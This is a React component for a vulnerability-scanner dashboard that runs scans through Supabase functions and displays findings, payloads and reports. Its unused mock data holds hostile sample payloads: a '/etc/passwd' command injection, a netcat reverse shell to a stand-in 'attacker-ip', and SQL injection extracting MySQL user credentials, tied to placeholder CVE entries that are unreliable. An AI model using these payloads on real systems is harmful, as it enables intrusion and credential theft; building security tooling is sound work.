import React, { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Progress } from '@/components/ui/progress';
import { ScrollArea } from '@/components/ui/scroll-area';
import { useToast } from '@/hooks/use-toast';
import { Shield, Search, AlertTriangle, CheckCircle, XCircle, Database, MapPin, Clock, Target, Zap, FileText, Download } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';

interface VulnerabilityScannerProps {
  onScanStart: () => void;
  onScanEnd: () => void;
  onTestPayload: (vulnerability: Vulnerability) => void;
}

interface Vulnerability {
  id: string;
  cve: string;
  title: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  exploitAvailable: boolean;
  service: string;
  port: number;
  location: {
    url: string;
    path: string;
    parameter?: string;
    method: string;
  };
  affectedVersions: string[];
  discoveryDetails: {
    timestamp: string;
    confidence: number;
    evidence: string;
  };
  exploitPayloads: Array<{
    type: string;
    payload: string;
    description: string;
  }>;
}

export const VulnerabilityScanner: React.FC<VulnerabilityScannerProps> = ({ onScanStart, onScanEnd, onTestPayload }) => {
  const { toast } = useToast();
  const [target, setTarget] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [progress, setProgress] = useState(0);
  const [vulnerabilities, setVulnerabilities] = useState<Vulnerability[]>([]);
  const [currentScanId, setCurrentScanId] = useState<string | null>(null);
  const [scanStats, setScanStats] = useState({
    total: 0,
    critical: 0,
    high: 0,
    medium: 0,
    low: 0,
  });

  const mockVulnerabilities: Vulnerability[] = [
    {
      id: '1',
      cve: 'CVE-2023-0001',
      title: 'Apache HTTP Server Remote Code Execution',
      severity: 'critical',
      description: 'Remote code execution vulnerability in Apache HTTP Server versions prior to 2.4.52',
      exploitAvailable: true,
      service: 'Apache',
      port: 80,
      location: {
        url: `http://${target || 'target.com'}`,
        path: '/cgi-bin/vulnerable.cgi',
        parameter: 'cmd',
        method: 'POST'
      },
      affectedVersions: ['Apache 2.4.0 - 2.4.51', 'Apache 2.2.x'],
      discoveryDetails: {
        timestamp: new Date().toISOString(),
        confidence: 95,
        evidence: 'Server banner detected: Apache/2.4.41'
      },
      exploitPayloads: [
        {
          type: 'command-injection',
          payload: '; cat /etc/passwd',
          description: 'Command injection to read system files'
        },
        {
          type: 'reverse-shell',
          payload: '; nc -e /bin/sh attacker-ip 4444',
          description: 'Reverse shell payload'
        }
      ]
    },
    {
      id: '2', 
      cve: 'CVE-2023-0002',
      title: 'OpenSSH Authentication Bypass',
      severity: 'high',
      description: 'Authentication bypass vulnerability in OpenSSH versions 8.0-8.2',
      exploitAvailable: false,
      service: 'SSH',
      port: 22,
      location: {
        url: `ssh://${target || 'target.com'}:22`,
        path: '/auth',
        method: 'SSH'
      },
      affectedVersions: ['OpenSSH 8.0', 'OpenSSH 8.1', 'OpenSSH 8.2'],
      discoveryDetails: {
        timestamp: new Date().toISOString(),
        confidence: 87,
        evidence: 'SSH banner: SSH-2.0-OpenSSH_8.1'
      },
      exploitPayloads: [
        {
          type: 'auth-bypass',
          payload: 'ssh -o PreferredAuthentications=none target.com',
          description: 'Attempt authentication bypass'
        }
      ]
    },
    {
      id: '3',
      cve: 'CVE-2023-0003', 
      title: 'MySQL Information Disclosure',
      severity: 'medium',
      description: 'Information disclosure vulnerability in MySQL 8.0.x',
      exploitAvailable: true,
      service: 'MySQL',
      port: 3306,
      location: {
        url: `mysql://${target || 'target.com'}:3306`,
        path: '/information_schema',
        method: 'QUERY'
      },
      affectedVersions: ['MySQL 8.0.0 - 8.0.25'],
      discoveryDetails: {
        timestamp: new Date().toISOString(),
        confidence: 78,
        evidence: 'MySQL version 8.0.23 detected via banner'
      },
      exploitPayloads: [
        {
          type: 'sql-injection',
          payload: "' UNION SELECT schema_name FROM information_schema.schemata--",
          description: 'Extract database schemas'
        },
        {
          type: 'data-extraction',
          payload: "' UNION SELECT user,password FROM mysql.user--",
          description: 'Extract user credentials'
        }
      ]
    },
  ];

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return 'bg-destructive text-destructive-foreground';
      case 'high': return 'bg-warning text-warning-foreground';
      case 'medium': return 'bg-scan-orange text-warning-foreground';
      case 'low': return 'bg-muted text-muted-foreground';
      default: return 'bg-muted text-muted-foreground';
    }
  };

  const startVulnerabilityScan = async () => {
    if (!target) {
      toast({
        title: "Error",
        description: "Please enter a target IP or hostname",
        variant: "destructive",
      });
      return;
    }

    setIsScanning(true);
    setProgress(0);
    setVulnerabilities([]);
    setScanStats({ total: 0, critical: 0, high: 0, medium: 0, low: 0 });
    onScanStart();

    try {
      // Call the vulnerability scan edge function
      const { data, error } = await supabase.functions.invoke('vulnerability-scan', {
        body: { target }
      });

      if (error) {
        throw error;
      }

      // Simulate progress updates while scanning
      const progressInterval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 90) {
            clearInterval(progressInterval);
            return 90;
          }
          return prev + 10;
        });
      }, 300);

      // Update scan results
      setCurrentScanId(data.scanId);
      setVulnerabilities(data.vulnerabilities || []);
      setScanStats(data.summary);
      setProgress(100);

      toast({
        title: "Vulnerability Scan Complete",
        description: `Found ${data.summary.total} vulnerabilities on ${target}`,
      });

      clearInterval(progressInterval);
      setIsScanning(false);
      onScanEnd();

    } catch (error) {
      console.error('Vulnerability scan error:', error);
      toast({
        title: "Scan Failed",
        description: "Failed to complete vulnerability scan. Please try again.",
        variant: "destructive",
      });
      setIsScanning(false);
      onScanEnd();
    }
  };

  const generateReport = async () => {
    if (!currentScanId) {
      toast({
        title: "Error",
        description: "No scan results available for report generation",
        variant: "destructive",
      });
      return;
    }

    try {
      const { data, error } = await supabase.functions.invoke('generate-report', {
        body: { 
          scanId: currentScanId,
          format: 'json',
          authorizedBy: 'Security Analyst'
        }
      });

      if (error) {
        throw error;
      }

      // Create and download the report
      const reportJson = JSON.stringify(data.report, null, 2);
      const blob = new Blob([reportJson], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `vulnerability-report-${target}-${new Date().toISOString().split('T')[0]}.json`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

      toast({
        title: "Report Generated",
        description: `Vulnerability report downloaded for ${target}`,
      });

    } catch (error) {
      console.error('Report generation error:', error);
      toast({
        title: "Report Generation Failed",
        description: "Failed to generate report. Please try again.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="space-y-6">
      {/* Configuration */}
      <Card className="bg-card border-border">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Database className="h-5 w-5 text-primary" />
            Vulnerability Scanner (Exploit-DB)
          </CardTitle>
          <CardDescription>
            Check target against known vulnerabilities and exploits
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex gap-4">
            <div className="flex-1 space-y-2">
              <Label htmlFor="vuln-target">Target (IP/Hostname)</Label>
              <Input
                id="vuln-target"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                placeholder="192.168.1.1 or example.com"
                disabled={isScanning}
                className="bg-input border-border"
              />
            </div>
            <div className="flex items-end">
              <Button 
                onClick={startVulnerabilityScan} 
                disabled={isScanning}
                className="bg-primary hover:bg-primary/90"
              >
                <Search className="h-4 w-4 mr-2" />
                {isScanning ? 'Scanning...' : 'Start Scan'}
              </Button>
            </div>
          </div>
          
          {isScanning && (
            <div className="space-y-2">
              <div className="flex justify-between text-sm">
                <span>Checking exploit database...</span>
                <span>{Math.round(progress)}%</span>
              </div>
              <Progress value={progress} className="w-full" />
            </div>
          )}
        </CardContent>
      </Card>

      {/* Statistics */}
      {scanStats.total > 0 && (
        <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
          <Card className="bg-card border-border">
            <CardContent className="p-4 text-center">
              <div className="text-2xl font-bold text-foreground">{scanStats.total}</div>
              <div className="text-sm text-muted-foreground">Total</div>
            </CardContent>
          </Card>
          <Card className="bg-card border-border">
            <CardContent className="p-4 text-center">
              <div className="text-2xl font-bold text-destructive">{scanStats.critical}</div>
              <div className="text-sm text-muted-foreground">Critical</div>
            </CardContent>
          </Card>
          <Card className="bg-card border-border">
            <CardContent className="p-4 text-center">
              <div className="text-2xl font-bold text-warning">{scanStats.high}</div>
              <div className="text-sm text-muted-foreground">High</div>
            </CardContent>
          </Card>
          <Card className="bg-card border-border">
            <CardContent className="p-4 text-center">
              <div className="text-2xl font-bold text-scan-orange">{scanStats.medium}</div>
              <div className="text-sm text-muted-foreground">Medium</div>
            </CardContent>
          </Card>
          <Card className="bg-card border-border">
            <CardContent className="p-4 text-center">
              <div className="text-2xl font-bold text-muted-foreground">{scanStats.low}</div>
              <div className="text-sm text-muted-foreground">Low</div>
            </CardContent>
          </Card>
        </div>
      )}

      {/* Vulnerabilities List */}
      <Card className="bg-card border-border">
        <CardHeader>
          <CardTitle className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <AlertTriangle className="h-5 w-5 text-warning" />
              Discovered Vulnerabilities
            </div>
            {vulnerabilities.length > 0 && (
              <Button
                onClick={generateReport}
                size="sm"
                className="bg-accent hover:bg-accent/90 text-accent-foreground"
              >
                <Download className="h-4 w-4 mr-2" />
                Generate Report
              </Button>
            )}
          </CardTitle>
        </CardHeader>
        <CardContent>
          <ScrollArea className="h-96">
            <div className="space-y-4">
              {vulnerabilities.map((vuln) => (
                <Card key={vuln.id} className="bg-secondary border-border">
                  <CardContent className="p-4 space-y-4">
                    {/* Header */}
                    <div className="flex items-start justify-between mb-2">
                      <div className="flex items-center gap-2 flex-wrap">
                        <Badge className={getSeverityColor(vuln.severity)}>
                          {vuln.severity.toUpperCase()}
                        </Badge>
                        <Badge variant="outline" className="border-accent text-accent">
                          {vuln.cve}
                        </Badge>
                        {vuln.exploitAvailable && (
                          <Badge className="bg-destructive text-destructive-foreground">
                            Exploit Available
                          </Badge>
                        )}
                        <Badge variant="outline" className="border-muted text-muted-foreground">
                          {vuln.discoveryDetails.confidence}% confidence
                        </Badge>
                      </div>
                      <div className="flex items-center gap-1 text-sm text-muted-foreground">
                        <Shield className="h-3 w-3" />
                        {vuln.service}:{vuln.port}
                      </div>
                    </div>

                    {/* Title and Description */}
                    <div>
                      <h3 className="font-semibold text-foreground mb-2">{vuln.title}</h3>
                      <p className="text-sm text-muted-foreground mb-3">{vuln.description}</p>
                    </div>

                    {/* Location Details */}
                    <div className="bg-muted/50 p-3 rounded-lg space-y-2">
                      <div className="flex items-center gap-2 text-sm">
                        <MapPin className="h-3 w-3 text-primary" />
                        <span className="font-medium text-foreground">Location:</span>
                        <code className="text-xs bg-terminal text-terminal-green px-1 rounded">
                          {vuln.location.path}
                        </code>
                      </div>
                      <div className="flex items-center gap-2 text-sm">
                        <Target className="h-3 w-3 text-primary" />
                        <span className="font-medium text-foreground">URL:</span>
                        <span className="text-xs text-muted-foreground break-all">{vuln.location.url}</span>
                      </div>
                      {vuln.location.parameter && (
                        <div className="flex items-center gap-2 text-sm">
                          <span className="font-medium text-foreground">Parameter:</span>
                          <code className="text-xs bg-terminal text-terminal-green px-1 rounded">
                            {vuln.location.parameter}
                          </code>
                        </div>
                      )}
                      <div className="flex items-center gap-2 text-sm">
                        <Clock className="h-3 w-3 text-primary" />
                        <span className="font-medium text-foreground">Discovered:</span>
                        <span className="text-xs text-muted-foreground">
                          {new Date(vuln.discoveryDetails.timestamp).toLocaleString()}
                        </span>
                      </div>
                    </div>

                    {/* Affected Versions */}
                    <div>
                      <span className="text-sm font-medium text-foreground">Affected Versions:</span>
                      <div className="flex flex-wrap gap-1 mt-1">
                        {vuln.affectedVersions.map((version, idx) => (
                          <Badge key={idx} variant="outline" className="text-xs border-warning text-warning">
                            {version}
                          </Badge>
                        ))}
                      </div>
                    </div>

                    {/* Evidence */}
                    <div>
                      <span className="text-sm font-medium text-foreground">Evidence:</span>
                      <code className="block text-xs bg-terminal text-terminal-green p-2 rounded mt-1">
                        {vuln.discoveryDetails.evidence}
                      </code>
                    </div>

                    {/* Available Payloads */}
                    {vuln.exploitPayloads.length > 0 && (
                      <div>
                        <span className="text-sm font-medium text-foreground mb-2 block">Available Payloads:</span>
                        <div className="space-y-2">
                          {vuln.exploitPayloads.map((payload, idx) => (
                            <div key={idx} className="bg-terminal/20 p-2 rounded border border-terminal/30">
                              <div className="flex items-center justify-between mb-1">
                                <Badge variant="outline" className="text-xs border-terminal text-terminal-green">
                                  {payload.type}
                                </Badge>
                              </div>
                              <code className="text-xs text-terminal-green font-mono block mb-1">
                                {payload.payload}
                              </code>
                              <p className="text-xs text-muted-foreground">{payload.description}</p>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* Action Buttons */}
                    <div className="flex items-center justify-between pt-2 border-t border-border">
                      <div className="flex items-center gap-2">
                        {vuln.exploitAvailable ? (
                          <XCircle className="h-4 w-4 text-destructive" />
                        ) : (
                          <CheckCircle className="h-4 w-4 text-success" />
                        )}
                        <span className="text-xs text-muted-foreground">
                          {vuln.exploitAvailable ? 'Exploit in database' : 'No exploit available'}
                        </span>
                      </div>
                      <div className="flex gap-2">
                        {vuln.exploitPayloads.length > 0 && (
                          <Button 
                            size="sm" 
                            onClick={() => onTestPayload(vuln)}
                            className="bg-accent hover:bg-accent/90 text-accent-foreground"
                          >
                            <Zap className="h-3 w-3 mr-1" />
                            Test Payload
                          </Button>
                        )}
                        <Button 
                          size="sm" 
                          variant="outline" 
                          onClick={generateReport}
                          className="border-primary text-primary hover:bg-primary hover:text-primary-foreground"
                        >
                          <FileText className="h-3 w-3 mr-1" />
                          Full Report
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
              {vulnerabilities.length === 0 && !isScanning && (
                <div className="text-center text-muted-foreground py-8">
                  No vulnerabilities found. Start a scan to check for known exploits.
                </div>
              )}
            </div>
          </ScrollArea>
        </CardContent>
      </Card>
    </div>
  );
};